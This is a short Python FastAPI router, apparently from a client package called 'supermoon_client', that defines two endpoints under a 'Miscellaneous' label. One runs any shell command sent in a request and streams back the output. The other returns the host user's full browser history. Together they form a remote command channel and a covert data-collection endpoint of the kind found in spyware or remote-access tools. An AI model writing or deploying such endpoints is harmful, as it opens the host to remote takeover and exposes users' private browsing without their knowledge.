import asyncio
from typing import Iterator

import browser_history
from fastapi import APIRouter
from starlette.responses import StreamingResponse

from supermoon_client.api_decorator import supermoon_api

router = APIRouter(
    prefix='/misc',
    tags=['Miscellaneous']
)


@router.post('/run')
@supermoon_api
async def run(command: str):
    async def run_command() -> Iterator[str]:
        process = await asyncio.create_subprocess_shell(command, stdout=asyncio.subprocess.PIPE)
        async for line in process.stdout:
            yield line

    return StreamingResponse(run_command())


@router.get('/browser_history')
@supermoon_api
async def get_browser_history():
    return browser_history.get_history().histories
